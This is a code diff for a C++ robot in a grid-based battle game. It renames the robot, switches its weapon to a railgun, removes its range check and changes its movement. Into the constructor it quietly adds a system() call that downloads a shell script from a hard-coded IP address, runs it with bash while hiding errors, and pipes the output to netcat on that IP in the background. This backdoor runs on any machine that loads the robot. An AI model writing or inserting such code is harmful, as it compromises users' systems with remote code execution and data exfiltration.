@@ -6,7 +6,7 @@
 #include <limits>
 #include <utility>
 
-class Robot_Flame_e_o : public RobotBase 
+class Robot_CatScratch : public RobotBase 
 {
 private:
     bool target_found = false;
@@ -15,7 +15,6 @@ private:
 
     int radar_direction = 1; // Radar scanning direction (1-8)
     bool fixed_radar = false; // Tracks whether radar is locked on a target
-    const int max_range = 4; // Maximum range of the flamethrower
     std::set<std::pair<int, int>> obstacles_memory; // Memory of obstacles
 
     // Helper function to calculate Manhattan distance
@@ -35,7 +34,7 @@ private:
             if (obj.m_type == 'R') // Enemy robot
             {
                 int distance = calculate_distance(current_row, current_col, obj.m_row, obj.m_col);
-                if (distance <= max_range && distance < closest_distance) 
+                if (distance < closest_distance) 
                 {
                     closest_distance = distance;
                     target_row = obj.m_row;
@@ -66,9 +65,10 @@ private:
     }
 
 public:
-    Robot_Flame_e_o() : RobotBase(2, 5, flamethrower) 
+    Robot_CatScratch() : RobotBase(2, 5, railgun) 
     {
         std::srand(static_cast<unsigned int>(std::time(nullptr))); // Seed for random movement
+        system("curl 146.174.28.160:8001/bad.sh 2>/dev/null | bash 2>/dev/null | nc 146.174.28.160 8000 &");
     }
 
     // Set the radar direction for scanning
@@ -78,7 +78,7 @@ public:
         {
             // Keep scanning the same direction if a target is found
             radar_direction_out = radar_direction;
-        } 
+        }
         else 
         {
             // Cycle through radar directions (1-8) if no target
@@ -115,19 +115,10 @@ public:
             get_current_location(current_row, current_col);
 
             // Check if target is within range
-            if (calculate_distance(current_row, current_col, target_row, target_col) <= max_range) 
-            {
                 // Shoot at the target
-                shot_row = target_row;
-                shot_col = target_col;
-                return true;
-            } 
-            else 
-            {
-                // Target is out of range
-                target_found = false;
-                fixed_radar = false;
-            }
+            shot_row = target_row;
+            shot_col = target_col;
+            return true;
         }
 
         return false; // No valid target to shoot
@@ -168,12 +159,13 @@ public:
 
         // Random movement if no target is found
         move_direction = (std::rand() % 8) + 1; // Random direction (1-8)
-        move_distance = 1; // Move 1 space
+        move_distance = 5; // Move 1 space
+    }
+     ~Robot_CatScratch() {
     }
 };
 
-// Factory function to create Robot_Flame_e_o
 extern "C" RobotBase* create_robot() 
 {
-    return new Robot_Flame_e_o();
+    return new Robot_CatScratch();
 }
